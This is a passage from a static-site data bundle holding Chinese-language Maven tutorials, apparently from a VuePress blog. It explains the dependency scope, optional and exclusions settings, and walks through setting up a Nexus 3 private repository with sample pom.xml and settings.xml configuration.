</dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"dependencies 标签详解",frontmatter:{title:"dependencies 标签详解",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2301.dependencies%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"01.框架/03.maven/2301.dependencies 标签详解.md",key:"v-4542ff7e",path:"/maven/2301/",headers:[{level:2,title:"scop",slug:"scop",normalizedTitle:"scop",charIndex:292},{level:2,title:"optional",slug:"optional",normalizedTitle:"optional",charIndex:3860},{level:2,title:"exclusions",slug:"exclusions",normalizedTitle:"exclusions",charIndex:4457}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"scop optional exclusions",content:'dependencies 标签下只会有一个 dependency，dependency 作用于我们引用哪些 jar 来给我们提供更多的技术支持。一般用法:\n\n<dependencies>\n    <dependency>\n        <groupId>org.apache.commons</groupId>\n        <artifactId>commons-pool2</artifactId>\n        <version>2.7.0</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\n控制 dependency (依赖) 的使用范围。通俗的讲，就是控制 Jar 包在哪些范围被加载和使用。使用方式如下：\n\n<dependency>\n    <groupId>com.giant</groupId>\n    <artifactId>giant-core-security</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop 一共有 6 个值可以使用：\n\n * compile（默认值）\n   如果没有指定 scope 值，该元素的默认值为 compile。被依赖（giant-core-securit）jar 需要参与到当前项目的编译，测试，打包，运行等阶段。打包的时候通常会包含被依赖（giant-core-securit）jar。\n\n * provided\n   被依赖 jar 理论上可以参与编译、测试、运行等阶段，相当于 compile，但是在打包阶段做了 exclude（排除） 的动作。例如， 如果我们在开发一个应用，在编译时我们需要依赖 xxxx.jar，但是在运行时我们不需要该 jar 包，因为这个 jar 包已由应用服务器或项目本身提供该依赖，此时我们需要使用 provided 进行范围修饰。\n\n * runtime\n   表示被依赖 jar 无需参与项目的编译阶段，但是会参与到项目的测试和运行阶段。与 compile 相比，被依赖 jar 无需参与项目的编译。适用场景：例如，在编译的时候我们不需要 JDBC API 的 jar 包，而在运行的时候我们才需要 JDBC 驱动包。\n\n * test\n   表示被依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。适用场景：例如，Junit 测试。\n\n * system\n   system 元素与 provided 元素类似，但是被依赖 jar 不会从 maven 仓库中查找，而是从本地系统中获取，systemPath 元素用于制定本地系统中 jar 文件的路径。例如：\n\n<dependency>\n    <groupId>sleepycat</groupId>\n    <artifactId>je</artifactId>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systemPath>${project.basedir}/lib/je-7.0.6.jar</systemPath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   它只使用在 <dependencyManagement> 中，表示从其它的 pom 中导入 dependency 的配置，例如（B 项目导入 A 项目中的包配置）。众所周知，当我们创建一个 SpringBoot 项目时，我们一定会写一个 <parent> 来继承 spring 所提供的所有依赖，但如果我又想使用 spring 提供的依赖，又想继承我自己的项目，此时 import 就有了用武之地\n\n# 普通 SpringBoot 依赖\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.6.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## 更换继承项目，并使用springboot 依赖\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- 变为我自己的父项目 --\x3e\n    <parent>\n        <groupId>com.giant.parent</groupId>\n        <artifactId>boot-parent</artifactId>\n        <version>1.0-SNAPSHOT</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot 依赖 --\x3e\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-parent</artifactId>\n                <version>2.2.6.RELEASE</version>\n                \x3c!-- 需要指明时pom还是jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional 是 maven 依赖 jar 时的一个选项，表示该依赖是可选的，不会被依赖传递。例如：B 依赖了日志框架 logback、log4j、apache commons log，这时候 A 引用 B 的 jar，因为 maven 有依赖传递机制，那么 A 项目就会有 3 个 jar 包，logback、log4j、apache commons log。实际上我们一般只会在项目中使用一种日志框架，那么我们项目中就会有多余的依赖，当这种情况时越来越多时，最后整个项目的 jar 包就有很多的多余依赖，导致项目很臃肿。\n\n对于这种情况，我们只要在 B 项目中把 logback、log4j、apache commons log 设置成 <optional>true</optional> 的即可。这时候 A 项目依赖 B 的时候，项目中不会有 logback、log4j、apache commons log 相关 jar 包，可以根据情况自行选择一个即可。\n\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\n用于排除依赖项中，不需要添加的 jar，或者使用自己版本的 jar 而不适用其他人所提供的 jar。如：引用的 spring-boot-starter-data-redis 会帮我们依赖 slf4j-api，但它使用的版本被爆出了 bug，那我要升级到更高版本，引入自己选中的版本。\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <exclusions>\n        \x3c!-- 排除spring-boot-starter-data-redis自带的 slf4j --\x3e\n        <exclusion>\n            <groupId>org.slf4j</groupId>\n            <artifactId>slf4j-api</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- 引用更改版本的slf4j --\x3e\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4j-api</artifactId>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'dependencies 标签下只会有一个 dependency，dependency 作用于我们引用哪些 jar 来给我们提供更多的技术支持。一般用法:\n\n<dependencies>\n    <dependency>\n        <groupid>org.apache.commons</groupid>\n        <artifactid>commons-pool2</artifactid>\n        <version>2.7.0</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\n控制 dependency (依赖) 的使用范围。通俗的讲，就是控制 jar 包在哪些范围被加载和使用。使用方式如下：\n\n<dependency>\n    <groupid>com.giant</groupid>\n    <artifactid>giant-core-security</artifactid>\n    <version>1.0-snapshot</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop 一共有 6 个值可以使用：\n\n * compile（默认值）\n   如果没有指定 scope 值，该元素的默认值为 compile。被依赖（giant-core-securit）jar 需要参与到当前项目的编译，测试，打包，运行等阶段。打包的时候通常会包含被依赖（giant-core-securit）jar。\n\n * provided\n   被依赖 jar 理论上可以参与编译、测试、运行等阶段，相当于 compile，但是在打包阶段做了 exclude（排除） 的动作。例如， 如果我们在开发一个应用，在编译时我们需要依赖 xxxx.jar，但是在运行时我们不需要该 jar 包，因为这个 jar 包已由应用服务器或项目本身提供该依赖，此时我们需要使用 provided 进行范围修饰。\n\n * runtime\n   表示被依赖 jar 无需参与项目的编译阶段，但是会参与到项目的测试和运行阶段。与 compile 相比，被依赖 jar 无需参与项目的编译。适用场景：例如，在编译的时候我们不需要 jdbc api 的 jar 包，而在运行的时候我们才需要 jdbc 驱动包。\n\n * test\n   表示被依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。适用场景：例如，junit 测试。\n\n * system\n   system 元素与 provided 元素类似，但是被依赖 jar 不会从 maven 仓库中查找，而是从本地系统中获取，systempath 元素用于制定本地系统中 jar 文件的路径。例如：\n\n<dependency>\n    <groupid>sleepycat</groupid>\n    <artifactid>je</artifactid>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systempath>${project.basedir}/lib/je-7.0.6.jar</systempath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   它只使用在 <dependencymanagement> 中，表示从其它的 pom 中导入 dependency 的配置，例如（b 项目导入 a 项目中的包配置）。众所周知，当我们创建一个 springboot 项目时，我们一定会写一个 <parent> 来继承 spring 所提供的所有依赖，但如果我又想使用 spring 提供的依赖，又想继承我自己的项目，此时 import 就有了用武之地\n\n# 普通 springboot 依赖\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.6.release</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## 更换继承项目，并使用springboot 依赖\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- 变为我自己的父项目 --\x3e\n    <parent>\n        <groupid>com.giant.parent</groupid>\n        <artifactid>boot-parent</artifactid>\n        <version>1.0-snapshot</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot 依赖 --\x3e\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-starter-parent</artifactid>\n                <version>2.2.6.release</version>\n                \x3c!-- 需要指明时pom还是jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional 是 maven 依赖 jar 时的一个选项，表示该依赖是可选的，不会被依赖传递。例如：b 依赖了日志框架 logback、log4j、apache commons log，这时候 a 引用 b 的 jar，因为 maven 有依赖传递机制，那么 a 项目就会有 3 个 jar 包，logback、log4j、apache commons log。实际上我们一般只会在项目中使用一种日志框架，那么我们项目中就会有多余的依赖，当这种情况时越来越多时，最后整个项目的 jar 包就有很多的多余依赖，导致项目很臃肿。\n\n对于这种情况，我们只要在 b 项目中把 logback、log4j、apache commons log 设置成 <optional>true</optional> 的即可。这时候 a 项目依赖 b 的时候，项目中不会有 logback、log4j、apache commons log 相关 jar 包，可以根据情况自行选择一个即可。\n\n<dependency>\n    <groupid>org.projectlombok</groupid>\n    <artifactid>lombok</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\n用于排除依赖项中，不需要添加的 jar，或者使用自己版本的 jar 而不适用其他人所提供的 jar。如：引用的 spring-boot-starter-data-redis 会帮我们依赖 slf4j-api，但它使用的版本被爆出了 bug，那我要升级到更高版本，引入自己选中的版本。\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-data-redis</artifactid>\n    <version>2.2.6.release</version>\n    <exclusions>\n        \x3c!-- 排除spring-boot-starter-data-redis自带的 slf4j --\x3e\n        <exclusion>\n            <groupid>org.slf4j</groupid>\n            <artifactid>slf4j-api</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- 引用更改版本的slf4j --\x3e\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4j-api</artifactid>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"使用 Nexus3.x 搭建私服",frontmatter:{title:"使用 Nexus3.x 搭建私服",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2302.%E4%BD%BF%E7%94%A8%20Nexus3.x%20%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D.html",relativePath:"01.框架/03.maven/2302.使用 Nexus3.x 搭建私服.md",key:"v-3ef166c4",path:"/maven/2302/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'下载地址 https://help.sonatype.com/repomanager3/product-information/download，下载好后进行解压缩会得到两个文件，nexus-3.39.0-01 和 sonatype-work。可以配置 nexus 变量到我们的环境中方便启动，也可以不配置每次都到 nexus-3.39.0-01/bin 下去启动。\n\nNEXUS_HOME: /opt/software/nexus3/nexus-3.39.0-01/\nPATH: %NEXUS_HOME%/bin\n\n\n1\n2\n\n\nnexus 默认使用的是 8081 端口，很多微服务的端口都会从 8080 等开始使用，可以修改 nexus 的端口，具体位置文件为 /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\n启动 nexus 命令\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# 提示信息\nWARNING: ************************************************************\nWARNING: Detected execution as "root" user.  This is NOT recommended!\nWARNING: ************************************************************\n\n# 这个信息需要修改 /opt/software/nexus3/nexus-3.39.0-01/bin/nexus 文件，找到 run_as_root=true，改为如下\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n启动成功后就可以登录 nexus 所提供的客户端界面，登录的时候会问你要账号密码，账号默认是 admin，密码在 /opt/software/nexus3/sonatype-work/nexus3/admin.password 文件中，登录成功后会要求更改密码，密码更改后 admin.password 会自动删除。修改会会让你选择严格模式，建议允许所有人访问，毕竟是私服没太大必要严格。\n\n\n\n\n\n\n\n点击设置、点击仓库，我们可以看到仓库管理配置列表，其中跟 Maven 相关的有 4 个，Maven 相对有 3 个 Type\n\n * proxy，表示为代理仓库，下载组件时，如果代理仓库搜索不到，则把请求转发到远程仓库（默认 https://repo1.maven.org/maven2/，该地址可以修改），并从远程仓库下载，然后将该组件缓存到代理库，当再次请求该组件时，则直接到代理仓库下载，不会再从远程仓库下载。\n * hosted\n   表示宿主仓库，主要用来部署团队内部组件，其中 maven-releases 用来部署团队内部的发布版组件，maven-snapshots 用来部署团队内部的快照版组件。\n * group\n   表示分组仓库，默认将 maven-central、maven-releases、maven-snapshots 三个仓库组合在一起对外提供服务，简化了 maven 客户端在 setting.xml 或 pom.xml 的配置\n\n修改 maven-central 的 proxy 地址，你可以在列表中点击 maven-central，就会进到 maven-central 的编辑页，然后在 Remote storage 修改为阿里云的仓库点击保存即可。\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven 想使用我们自己搭建的 nexus，只需要在 maven-3.8.4\\conf\\settings.xml 文件修改镜像地址即可\n\n  <mirrors>\n\t\x3c!-- 阿里云 --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorOf>*</mirrorOf>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> 按照以上的操作，我们只新启动一个项目，并在项目中指定该 maven，此时我们下载的 jar 就会缓存到 nexus 里，当其他同事使用该项目就会发现该项目的依赖下载为我们 nexus 的部署地址。\n\n但是这还不够，在实际开发中，除了我们本身使用的第三方依赖外，我们自己也会写一些依赖包或工具包等，此时若想让其他同事可以下载并依赖使用，我们就需要把我们制作的 jar 发布到 nexus 里去。我们先要在我们的 maven 的 settings.xml 中配置在 nexus 的账号密码\n\n  <servers>\n    <server>\n      \x3c!-- 注意id  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之后我们只需要创建我们的 jar 并添加一些配置即可，相应配置在代码中有说明\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    \x3c!-- 后缀 SNAPSHOT 就会把 jar 发布到 nexus repository的 maven-snapshots --\x3e\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- 配置 nexus --\x3e\n    <distributionManagement>\n        <repository>\n            \x3c!-- 这里的id邀约 setting.xml 配置的id相同 --\x3e\n            <id>nexus</id>\n            \x3c!-- 配置发布版的名称与路径 --\x3e\n            <name>Nexus Release Repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotRepository>\n            <id>nexus</id>\n            <name>Nexus Snapshot Repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotRepository>\n    </distributionManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n配置完成后，写好的你的工具类，然后对其进行 maven 包的发布\n\n\n\n\n\n\n\n然后让你的同事进行依赖引入，就可以调用你的方法了。\n\n<dependency>\n    <groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    <version>1.0-SNAPSHOT</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> 相同版本的 jar 默认是不能重复发布到 nexus 中的，可以修改你要发布地址的配置，改为 Allow redeploy\n\n\n\n> 如果发现自己上传的包，确定无误后无法下载依赖，不管是自己还是别人，那么可能原因是 Maven 内置的插件远程仓库配置，关闭了对 SNAPSHOT 的支持，防止不稳定的构建。所以解决办法最关键的是：在 maven 的 conf 目录下的 setting.xml 文件中，添加 对 SNAPSHOT 的支持\n\n<snapshots>\n　　<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\n在你 maven setting.xml 里加，或者 pom.xml 里加都行\n\n<profiles>\n    <profile>\n        <id>central-repo</id>\n        <repositories>\n            <repository>\n                <id>central</id>\n                <name>Central-repo</name>\n                <url>http://******/central</url>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n            </repository>\n        </repositories>\n    </profile>\n</profiles>\n\n<activeProfiles>\n    <activeProfile>central-repo</activeProfile>\n</activeProfiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n如果需要添加两个可以是\n\n<profile>\n    <repositories>\n        <repository>\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>releases</id>\n            <name>release</name>\n            <url>http://***********/maven-releases/</url>\n        </repository>\n        <repository>\n            <releases>\n                <enabled>false</enabled>\n            </releases>\n            <snapshots>\n                <enabled>true</enabled>\n            </snapshots>\n            <id>snapshots</id>\n            <name>libs-snapshot</name>\n            <url>http://***************/maven-snapshots/</url>\n        </repository>\n    </repositories>\n    <id>artifactory</id>\n</profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'下载地址 https://help.sonatype.com/repomanager3/product-information/download，下载好后进行解压缩会得到两个文件，nexus-3.39.0-01 和 sonatype-work。可以配置 nexus 变量到我们的环境中方便启动，也可以不配置每次都到 nexus-3.39.0-01/bin 下去启动。\n\nnexus_home: /opt/software/nexus3/nexus-3.39.0-01/\npath: %nexus_home%/bin\n\n\n1\n2\n\n\nnexus 默认使用的是 8081 端口，很多微服务的端口都会从 8080 等开始使用，可以修改 nexus 的端口，具体位置文件为 /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\n启动 nexus 命令\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# 提示信息\nwarning: ************************************************************\nwarning: detected execution as "root" user.  this is not recommended!\nwarning: ************************************************************\n\n# 这个信息需要修改 /opt/software/nexus3/nexus-3.39.0-01/bin/nexus 文件，找到 run_as_root=true，改为如下\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n启动成功后就可以登录 nexus 所提供的客户端界面，登录的时候会问你要账号密码，账号默认是 admin，密码在 /opt/software/nexus3/sonatype-work/nexus3/admin.password 文件中，登录成功后会要求更改密码，密码更改后 admin.password 会自动删除。修改会会让你选择严格模式，建议允许所有人访问，毕竟是私服没太大必要严格。\n\n\n\n\n\n\n\n点击设置、点击仓库，我们可以看到仓库管理配置列表，其中跟 maven 相关的有 4 个，maven 相对有 3 个 type\n\n * proxy，表示为代理仓库，下载组件时，如果代理仓库搜索不到，则把请求转发到远程仓库（默认 https://repo1.maven.org/maven2/，该地址可以修改），并从远程仓库下载，然后将该组件缓存到代理库，当再次请求该组件时，则直接到代理仓库下载，不会再从远程仓库下载。\n * hosted\n   表示宿主仓库，主要用来部署团队内部组件，其中 maven-releases 用来部署团队内部的发布版组件，maven-snapshots 用来部署团队内部的快照版组件。\n * group\n   表示分组仓库，默认将 maven-central、maven-releases、maven-snapshots 三个仓库组合在一起对外提供服务，简化了 maven 客户端在 setting.xml 或 pom.xml 的配置\n\n修改 maven-central 的 proxy 地址，你可以在列表中点击 maven-central，就会进到 maven-central 的编辑页，然后在 remote storage 修改为阿里云的仓库点击保存即可。\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven 想使用我们自己搭建的 nexus，只需要在 maven-3.8.4\\conf\\settings.xml 文件修改镜像地址即可\n\n  <mirrors>\n\t\x3c!-- 阿里云 --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorof>central</mirrorof>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorof>*</mirrorof>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> 按照以上的操作，我们只新启动一个项目，并在项目中指定该 maven，此时我们下载的 jar 就会缓存到 nexus 里，当其他同事使用该项目就会发现该项目的依赖下载为我们 nexus 的部署地址。\n\n但是这还不够，在实际开发中，除了我们本身使用的第三方依赖外，我们自己也会写一些依赖包或工具包等，此时若想让其他同事可以下载并依赖使用，我们就需要把我们制作的 jar 发布到 nexus 里去。我们先要在我们的 maven 的 settings.xml 中配置在 nexus 的账号密码\n\n  <servers>\n    <server>\n      \x3c!-- 注意id  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之后我们只需要创建我们的 jar 并添加一些配置即可，相应配置在代码中有说明\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    \x3c!-- 后缀 snapshot 就会把 jar 发布到 nexus repository的 maven-snapshots --\x3e\n    <version>1.0-snapshot</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- 配置 nexus --\x3e\n    <distributionmanagement>\n        <repository>\n            \x3c!-- 这里的id邀约 setting.xml 配置的id相同 --\x3e\n            <id>nexus</id>\n            \x3c!-- 配置发布版的名称与路径 --\x3e\n            <name>nexus release repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotrepository>\n            <id>nexus</id>\n            <name>nexus snapshot repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotrepository>\n    </distributionmanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n配置完成后，写好的你的工具类，然后对其进行 maven 包的发布\n\n\n\n\n\n\n\n然后让你的同事进行依赖引入，就可以调用你的方法了。\n\n<dependency>\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    <version>1.0-snapshot</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> 相同版本的 jar 默认是不能重复发布到 nexus 中的，可以修改你要发布地址的配置，改为 allow redeploy\n\n\n\n> 如果发现自己上传的包，确定无误后无法下载依赖，不管是自己还是别人，那么可能原因是 maven 内置的插件远程仓库配置，关闭了对 snapshot 的支持，防止不稳定的构建。所以解决办法最关键的是：在 maven 的 conf 目录下的 setting.xml 文件中，添加 对 snapshot 的支持\n\n<snapshots>\n　　<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\n在你 maven setting.xml 里加，或者 pom.xml 里加都行\n\n<profiles>\n    <profile>\n        <id>central-repo</id>\n        <repositories>\n            <repository>\n                <id>central</id>\n                <name>central-repo</name>\n                <url>http://******/central</url>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n            </repository>\n        </repositories>\n    </profile>\n</profiles>\n\n<activeprofiles>\n    <activeprofile>central-repo</activeprofile>\n</activeprofiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n如果需要添加两个可以是\n\n<profile>\n    <repositories>\n        <repository>\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n            <id>releases</id>\n            <name>release</name>\n            <url>http://***********/maven-releases/</url>\n        </repository>\n        <repository>\n            <releases>\n                <enabled>false</enabled>\n            </releases>\n            <snapshots>\n                <enabled>true</enabled>\n            </snapshots>\n            <id>snapshots</id>\n            <name>libs-snapshot</name>\n            <url>http://***************/maven-snapshots/</url>\n        </repository>\n    </repositories>\n    